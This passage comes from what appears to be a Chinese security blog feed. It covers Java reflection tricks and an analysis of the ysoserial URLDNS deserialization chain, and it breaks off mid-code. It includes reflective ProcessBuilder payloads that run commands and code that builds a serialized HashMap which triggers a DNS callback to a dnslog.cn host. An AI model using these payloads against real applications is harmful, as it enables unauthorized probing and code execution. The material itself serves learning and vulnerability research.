title="1.没有无参构造函数，没有类似单列模式的静态方法如何反射实例化该类"></a>1.没有无参构造函数，没有类似单列模式的静态方法如何反射实例化该类</h3><p>此时就要用到一个新的反射方法getConstructor()。</p><p>和getMethod()类似，getConstructor()接收的参数是构造函数列表类型，因为构造函数也支持重载，必须用<code>参数列表类型</code>才能唯一确定一个构造函数。获取到构造函数后我们用newInstance()来实例化。</p><h3 id="getConstructor-："><a href="#getConstructor-：" class="headerlink" title="getConstructor()："></a>getConstructor()：</h3><p><img src="4.1.png" alt="4.1"></p><p>getConstructor()接收构造函数参数列表类型。</p><p>一个简单demo：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.javaSec;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Test2</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">int</span> test1;</span><br><span class="line">    <span class="keyword">private</span> String test2;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*注意此处构造函数属性为public*/</span></span><br><span class="line">     <span class="function"><span class="keyword">public</span> <span class="title">Test2</span><span class="params">(<span class="keyword">int</span> test1,String test2)</span></span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.test1=test1;</span><br><span class="line">        <span class="keyword">this</span>.test2=test2;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">display</span><span class="params">()</span></span>&#123;</span><br><span class="line">         System.out.println(<span class="string">&quot;反射调用：&quot;</span>+test1+<span class="string">&quot; &quot;</span>+test2);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception</span>&#123;</span><br><span class="line">        Class clazz = Class.forName(<span class="string">&quot;com.javaSec.Test2&quot;</span>);</span><br><span class="line">     <span class="comment">/*getMethod()获取函数，invoke执行，因为display()为普通方法，所以传入类对象。</span></span><br><span class="line"><span class="comment">     类对象：getConstructor()获取构造函数，newInstance实例化</span></span><br><span class="line"><span class="comment">     */</span>  clazz.getMethod(<span class="string">&quot;display&quot;</span>).invoke(clazz.getConstructor(<span class="keyword">int</span>.class,String.class).newInstance(<span class="number">1</span>,<span class="string">&quot;h11ba1&quot;</span>));</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">输出：反射调用：<span class="number">1</span> h11ba1</span><br></pre></td></tr></table></figure><h3 id="2-如果一个方法或构造函数是私有的，能否通过反射执行他"><a href="#2-如果一个方法或构造函数是私有的，能否通过反射执行他" class="headerlink" title="2.如果一个方法或构造函数是私有的，能否通过反射执行他"></a>2.如果一个方法或构造函数是私有的，能否通过反射执行他</h3><p>getConstructor()获取的构造函数只能是公有的，private, protected,不书写(default),都会产生报错：</p><p><img src="4.2.png" alt="4.2"></p><p>这里就涉及到getDeclared系列的反射，与普通的getMethod,getConstructor区别是：</p><ul><li>getMethod系列方法获取的是当前类中所有<code>公共方法</code>，包括从父类继承的方法。</li><li>getDeclaredMethod系列方法获取的是当前类中声明的方法，是实在写在这个类里的，包括私有的方法，但从父类里继承来的就不包含了</li></ul><p><strong>getDeclaredMethod 的具体用法和 getMethod 类似， getDeclaredConstructor 的具体用法和getConstructor 类似</strong></p><h3 id="getDeclaredConstructor"><a href="#getDeclaredConstructor" class="headerlink" title="getDeclaredConstructor():"></a>getDeclaredConstructor():</h3><p><img src="4.3.png" alt="4.3"></p><p>getDeclaredConstructor接收构造函数参数列表。</p><p>使用实例：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.javaSec;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Test1</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">int</span> test1;</span><br><span class="line">    <span class="keyword">private</span> String test2;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*注意此处构造函数属性为private*/</span></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="title">Test1</span><span class="params">(<span class="keyword">int</span> test1,String test2)</span></span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.test1=test1;</span><br><span class="line">        <span class="keyword">this</span>.test2=test2;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">display</span><span class="params">()</span></span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;反射调用：&quot;</span>+test1+<span class="string">&quot; &quot;</span>+test2);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception</span>&#123;</span><br><span class="line">        Class clazz = Class.forName(<span class="string">&quot;com.javaSec.Test1&quot;</span>);</span><br><span class="line">        <span class="comment">/*使用getDeclaredMethod,getDeclaredConstructor获取私有构造函数和私有方法*/</span></span><br><span class="line">        clazz.getDeclaredMethod(<span class="string">&quot;display&quot;</span>).invoke(clazz.getDeclaredConstructor(<span class="keyword">int</span>.class,String.class).newInstance(<span class="number">1</span>,<span class="string">&quot;h11ba1&quot;</span>));</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">输出：反射调用：<span class="number">1</span> h11ba1</span><br></pre></td></tr></table></figure><h2 id="0x05-ps-构造函数接收参数为String-command时："><a href="#0x05-ps-构造函数接收参数为String-command时：" class="headerlink" title="0x05 ps:构造函数接收参数为String... command时："></a>0x05 ps:构造函数接收参数为<code>String... command</code>时：</h2><p>public ProcessBuilder(String… command)接收参数为<code>String... command</code>。这种情况下getConstructor()怎么传入参数类型列表呢？</p><p>p神给了说明，简单记录一下：</p><p><code>...</code>：这样的语法表示这个函数参数个数是可变的。</p><p>对于可变长参数，java在编译的时候，会编译成一个数组，也就是说一下两种写法在底层是等价的(也就不能重载)：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">hello</span><span class="params">(String[] names)</span> </span>&#123;&#125; </span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">hello</span><span class="params">(String...names)</span> </span>&#123;&#125;</span><br></pre></td></tr></table></figure><p>所以获取ProcessBuilder(String… command)式的构造函数，可以这样写：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Class clazz = Class.forName(<span class="string">&quot;java.lang.ProcessBuilder&quot;</span>); </span><br><span class="line">clazz.getConstructor(String[].class)</span><br></pre></td></tr></table></figure><p>将字符串数组的类String[].class传给getConstructor即可。</p><p>在调用newInstance时，因为这个函数本身接受的是一个可变参数，传给ProcessBuilder的也是一个可变参数，二者叠加为一个二维数组，所以payload如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Class clazz = Class.forName(<span class="string">&quot;java.lang.ProcessBuilder&quot;</span>); ((ProcessBuilder)clazz.getConstructor(String[].class).newInstance(<span class="keyword">new</span> String[][]&#123;&#123;<span class="string">&quot;calc.exe&quot;</span>&#125;&#125;)).start();</span><br></pre></td></tr></table></figure><p>完成采用反射的方式：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.javaSec;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Test3</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception</span>&#123;</span><br><span class="line">        Class clazz = Class.forName(<span class="string">&quot;java.lang.ProcessBuilder&quot;</span>);</span><br><span class="line">        Object obj=((ProcessBuilder)clazz.getConstructor(String[].class).newInstance(<span class="keyword">new</span> String[][]&#123;&#123;<span class="string">&quot;touch&quot;</span>,<span class="string">&quot;test4.txt&quot;</span>&#125;&#125;));</span><br><span class="line">        clazz.getMethod(<span class="string">&quot;start&quot;</span>).invoke(obj);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="0x06-参数："><a href="#0x06-参数：" class="headerlink" title="0x06 参数："></a>0x06 参数：</h2><p>p神代码审计星球—java漫谈反射系列</p><p><a href="https://xz.aliyun.com/t/7029">JAVA反序列化 - 反射机制</a></p>]]></content>
      
      
      <categories>
          
          <category> 代码审计 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> java反射 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>反序列化URLDNS</title>
      <link href="/2020/07/05/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96URLDNS/"/>
      <url>/2020/07/05/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96URLDNS/</url>
      
        <content type="html"><![CDATA[<p>学习java反序列化自然绕不开cc链，ysoserial。ysoserial中最简单的链条就属urldns，用来作为入门学习很不错，下面简单分析，跟一下流程。</p><h2 id="0x01-利用链"><a href="#0x01-利用链" class="headerlink" title="0x01 利用链"></a>0x01 利用链</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">HashMap-&gt;readObject()</span><br><span class="line">HashMap-&gt;hash()</span><br><span class="line">URL-&gt;hashCode()</span><br><span class="line">URLStreamHandler-&gt;hashCode()</span><br><span class="line">URLStreamHandler-&gt;getHostAddress()</span><br><span class="line">InetAddress-&gt;getByName()</span><br></pre></td></tr></table></figure><p>依此跟进分析：</p><h3 id="java-util-HashMap-readObjectr"><a href="#java-util-HashMap-readObjectr" class="headerlink" title="java.util.HashMap#readObjectr():"></a>java.util.HashMap#readObjectr():</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">readObject</span><span class="params">(java.io.ObjectInputStream s)</span></span></span><br><span class="line"><span class="function">        <span class="keyword">throws</span> IOException, ClassNotFoundException </span>&#123;</span><br><span class="line">        <span class="comment">// Read in the threshold (ignored), loadfactor, and any hidden stuff</span></span><br><span class="line">        s.defaultReadObject();</span><br><span class="line">        reinitialize();</span><br><span class="line">        <span class="keyword">if</span> (loadFactor &lt;= <span class="number">0</span> || Float.isNaN(loadFactor))</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> InvalidObjectException(<span class="string">&quot;Illegal load factor: &quot;</span> +</span><br><span class="line">                                             loadFactor);</span><br><span class="line">        s.readInt();                <span class="comment">// Read and ignore number of buckets</span></span><br><span class="line">        <span class="keyword">int</span> mappings = s.readInt(); <span class="comment">// Read number of mappings (size)</span></span><br><span class="line">        <span class="keyword">if</span> (mappings &lt; <span class="number">0</span>)</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> InvalidObjectException(<span class="string">&quot;Illegal mappings count: &quot;</span> +</span><br><span class="line">                                             mappings);</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> (mappings &gt; <span class="number">0</span>) &#123; <span class="comment">// (if zero, use defaults)</span></span><br><span class="line">            <span class="comment">// Size the table using given load factor only if within</span></span><br><span class="line">            <span class="comment">// range of 0.25...4.0</span></span><br><span class="line">            <span class="keyword">float</span> lf = Math.min(Math.max(<span class="number">0.25f</span>, loadFactor), <span class="number">4.0f</span>);</span><br><span class="line">            <span class="keyword">float</span> fc = (<span class="keyword">float</span>)mappings / lf + <span class="number">1.0f</span>;</span><br><span class="line">            <span class="keyword">int</span> cap = ((fc &lt; DEFAULT_INITIAL_CAPACITY) ?</span><br><span class="line">                       DEFAULT_INITIAL_CAPACITY :</span><br><span class="line">                       (fc &gt;= MAXIMUM_CAPACITY) ?</span><br><span class="line">                       MAXIMUM_CAPACITY :</span><br><span class="line">                       tableSizeFor((<span class="keyword">int</span>)fc));</span><br><span class="line">            <span class="keyword">float</span> ft = (<span class="keyword">float</span>)cap * lf;</span><br><span class="line">            threshold = ((cap &lt; MAXIMUM_CAPACITY &amp;&amp; ft &lt; MAXIMUM_CAPACITY) ?</span><br><span class="line">                         (<span class="keyword">int</span>)ft : Integer.MAX_VALUE);</span><br><span class="line"></span><br><span class="line">            <span class="comment">// Check Map.Entry[].class since it&#x27;s the nearest public type to</span></span><br><span class="line">            <span class="comment">// what we&#x27;re actually creating.</span></span><br><span class="line">            SharedSecrets.getJavaOISAccess().checkArray(s, Map.Entry[].class, cap);</span><br><span class="line">            <span class="meta">@SuppressWarnings(&#123;&quot;rawtypes&quot;,&quot;unchecked&quot;&#125;)</span></span><br><span class="line">            Node&lt;K,V&gt;[] tab = (Node&lt;K,V&gt;[])<span class="keyword">new</span> Node[cap];</span><br><span class="line">            table = tab;</span><br><span class="line"></span><br><span class="line">            <span class="comment">// Read the keys and values, and put the mappings in the HashMap</span></span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; mappings; i++) &#123;</span><br><span class="line">                <span class="meta">@SuppressWarnings(&quot;unchecked&quot;)</span></span><br><span class="line">                    K key = (K) s.readObject();</span><br><span class="line">                <span class="meta">@SuppressWarnings(&quot;unchecked&quot;)</span></span><br><span class="line">                    V value = (V) s.readObject();</span><br><span class="line">                putVal(hash(key), key, value, <span class="keyword">false</span>, <span class="keyword">false</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>其中最后一行putVal()调用了hash(key)。跟进hash()</p><h3 id="java-util-HashMap-hash"><a href="#java-util-HashMap-hash" class="headerlink" title="java.util.HashMap#hash():"></a>java.util.HashMap#hash():</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">int</span> <span class="title">hash</span><span class="params">(Object key)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> h;</span><br><span class="line">    <span class="keyword">return</span> (key == <span class="keyword">null</span>) ? <span class="number">0</span> : (h = key.hashCode()) ^ (h &gt;&gt;&gt; <span class="number">16</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>其中key.hashCode()获取了传入对象的hashCode()。</p><p>转到</p><h3 id="java-net-URL-hashCode"><a href="#java-net-URL-hashCode" class="headerlink" title="java.net.URL#hashCode():"></a>java.net.URL#hashCode():</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">synchronized</span> <span class="keyword">int</span> <span class="title">hashCode</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (hashCode != -<span class="number">1</span>)</span><br><span class="line">        <span class="keyword">return</span> hashCode;</span><br><span class="line"></span><br><span class="line">    hashCode = handler.hashCode(<span class="keyword">this</span>);</span><br><span class="line">    <span class="keyword">return</span> hashCode;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>url对象的hashCode()，当hashCode参数=-1时，调用handler.hashCode()</p><p>继续跟进</p><h3 id="java-net-URLStreamHandler-hashCode"><a href="#java-net-URLStreamHandler-hashCode" class="headerlink" title="java.net.URLStreamHandler#hashCode():"></a>java.net.URLStreamHandler#hashCode():</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">protected</span> <span class="keyword">int</span> <span class="title">hashCode</span><span class="params">(URL u)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> h = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Generate the protocol part.</span></span><br><span class="line">        String protocol = u.getProtocol();</span><br><span class="line">        <span class="keyword">if</span> (protocol != <span class="keyword">null</span>)</span><br><span class="line">            h += protocol.hashCode();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Generate the host part.</span></span><br><span class="line">        InetAddress addr = getHostAddress(u);</span><br><span class="line">        <span class="keyword">if</span> (addr != <span class="keyword">null</span>) &#123;</span><br><span class="line">            h += addr.hashCode();</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            String host = u.getHost();</span><br><span class="line">            <span class="keyword">if</span> (host != <span class="keyword">null</span>)</span><br><span class="line">                h += host.toLowerCase().hashCode();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Generate the file part.</span></span><br><span class="line">        String file = u.getFile();</span><br><span class="line">        <span class="keyword">if</span> (file != <span class="keyword">null</span>)</span><br><span class="line">            h += file.hashCode();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Generate the port part.</span></span><br><span class="line">        <span class="keyword">if</span> (u.getPort() == -<span class="number">1</span>)</span><br><span class="line">            h += getDefaultPort();</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            h += u.getPort();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Generate the ref part.</span></span><br><span class="line">        String ref = u.getRef();</span><br><span class="line">        <span class="keyword">if</span> (ref != <span class="keyword">null</span>)</span><br><span class="line">            h += ref.hashCode();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> h;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>其中重点关注InetAddress addr = getHostAddress(u);</p><p>获取传入url的ip，跟进</p><h3 id="java-net-URLStreamHandler-getHostAddress"><a href="#java-net-URLStreamHandler-getHostAddress" class="headerlink" title="java.net.URLStreamHandler#getHostAddress():"></a>java.net.URLStreamHandler#getHostAddress():</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">protected</span> <span class="keyword">synchronized</span> InetAddress <span class="title">getHostAddress</span><span class="params">(URL u)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (u.hostAddress != <span class="keyword">null</span>)</span><br><span class="line">            <span class="keyword">return</span> u.hostAddress;</span><br><span class="line"></span><br><span class="line">        String host = u.getHost();</span><br><span class="line">        <span class="keyword">if</span> (host == <span class="keyword">null</span> || host.equals(<span class="string">&quot;&quot;</span>)) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                u.hostAddress = InetAddress.getByName(host);</span><br><span class="line">            &#125; <span class="keyword">catch</span> (UnknownHostException ex) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">            &#125; <span class="keyword">catch</span> (SecurityException se) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> u.hostAddress;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>其中 u.hostAddress = InetAddress.getByName(host);</p><p>getByName(host)进行了一次dns查询，达到该利用链的目的，发起dns查询判断序列化点是否存在序列化漏洞。</p><p>该链条第一次跟着这样看完可能当场懵逼，不都还在HashMap类吗？怎么就跳到了URL类，这两个类怎么联系在一起的？</p><p>我们不妨反过来看一下这个链条：</p><h2 id="0x02-反向理解urldns利用链"><a href="#0x02-反向理解urldns利用链" class="headerlink" title="0x02 反向理解urldns利用链"></a>0x02 反向理解urldns利用链</h2><p>经过上面的分析我们确定</p><p>URL类的hashCode()方法会调用–&gt;</p><p>URLStreamHandler类的hashCode()调用–&gt;</p><p>URLStreamHandler类的getHostAddress()–&gt;</p><p>getHostAddress方法中调用了InetAddress.getByName(host);此处造成了dns查询。</p><p>所以我们想要利用该dns查询链条，就需要找到一个地方调用url.hashCode()。</p><p>而java.util.HashMap#hash():中 </p><p><img src="/Users/h11ba1/Desktop/markdown/%E5%8D%9A%E5%AE%A2/java%E5%AE%89%E5%85%A8%E7%B3%BB%E5%88%97%E5%AD%A6%E4%B9%A0/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96URLDNS/2.1.png" alt="2.1"></p><p>只要key键值为一个url对象即可触发url.hashCode()。</p><p>而java.util.HashMap#readObject()方法中就调用了Hash()方法。</p><p><img src="/Users/h11ba1/Desktop/markdown/%E5%8D%9A%E5%AE%A2/java%E5%AE%89%E5%85%A8%E7%B3%BB%E5%88%97%E5%AD%A6%E4%B9%A0/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96URLDNS/2.2.png" alt="2.2"></p><p>所以可以大致梳理一遍流程就是：</p><p>HashMap-&gt;readObject()<br>HashMap-&gt;hash()<br>URL-&gt;hashCode()<br>URLStreamHandler-&gt;hashCode()<br>URLStreamHandler-&gt;getHostAddress()<br>InetAddress-&gt;getByName()</p><h2 id="0x03-php序列化和java序列化的思考对比"><a href="#0x03-php序列化和java序列化的思考对比" class="headerlink" title="0x03 php序列化和java序列化的思考对比"></a>0x03 php序列化和java序列化的思考对比</h2><p>这里也发现了java序列化函数和php的不同点。php 通过 unserailize() 触发__ wakeup 、 __sleep 等魔法函数，实现反序列化调用危险函数的目的。</p><p>而java中大量的库会实现 readObject 、 writeObject 方法。开发者通过重写readObject()，writeObject()来达到序列化的目的，所以很多类库中都存在重写的序列化函数。用得多自然也增大了序列化攻击的风险。</p><p>php反序列化漏洞和java反序列化在寻找利用链这点上有异曲同工之妙，但是也存在很大的不同。</p><p>java因为一些基本类库中就存在反序列化利用链条，所以基本只要能够控制反序列化输入流即可造成反序列化漏洞。</p><p>而php的序列化除了框架层面的链条，没有那么多通用的链条可以反序列化利用。这就造成了php没有java那么多的序列化漏洞吧。</p><h2 id="0x04-payload构造"><a href="#0x04-payload构造" class="headerlink" title="0x04 payload构造"></a>0x04 payload构造</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.company;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.FileInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.FileOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.net.URL;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">URLDNS</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        <span class="comment">//0x01.生成payload</span></span><br><span class="line">        <span class="comment">//设置一个hashMap</span></span><br><span class="line">        HashMap&lt;URL, String&gt; hashMap = <span class="keyword">new</span> HashMap&lt;URL, String&gt;();</span><br><span class="line">        <span class="comment">//设置我们可以接受DNS查询的地址</span></span><br><span class="line">        URL url = <span class="keyword">new</span> URL(<span class="string">&quot;http://z2iif2.dnslog.cn&quot;</span>);</span><br><span class="line">        <span class="comment">//将URL的hashCode字段设置为允许修改</span></span><br><span class="line">        Field f = Class.forName(<span class="string">&quot;java.net.URL&quot;</span>).getDeclaredField(<span class="string">&quot;hashCode&quot;</span>);</span><br><span class="line">        f.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        <span class="comment">//**以下的蜜汁操作是为了不在put中触发URLDNS查询，如果不这么写就会触发两次（之后会解释）**</span></span><br><span class="line">        <span class="comment">//1. 设置url的hashCode字段为0xdeadbeef（随意的值）</span></span><br><span class="line">        f.set(url, <span class="number">0xdeadbeef</span>);</span><br><span class="line">        <span class="comment">//2. 将url放入hashMap中，右边参数随便写</span></span><br><span class="line">        hashMap.put(url, <span class="string">&quot;rmb122&quot;</span>);</span><br><span class="line">        <span class="comment">//修改url的hashCode字段为-1，为了触发DNS查询（之后会解释）</span></span><br><span class="line">        f.set(url, -<span class="number">1</span>);</span><br><span class="line">        <span class="comment">//0x02.写入文件模拟网络传输</span></span><br><span class="line">        ObjectOutputStream oos = <span class="keyword">new</span> ObjectOutputStream(<span class="keyword">new</span> FileOutputStream(<span class="string">&quot;out.bin&quot;</span>));</span><br><span class="line">        oos.writeObject(hashMap);</span><br><span class="line">        <span class="comment">//0x03.读取文件，进行反序列化触发payload</span></span><br><span class="line">        ObjectInputStream 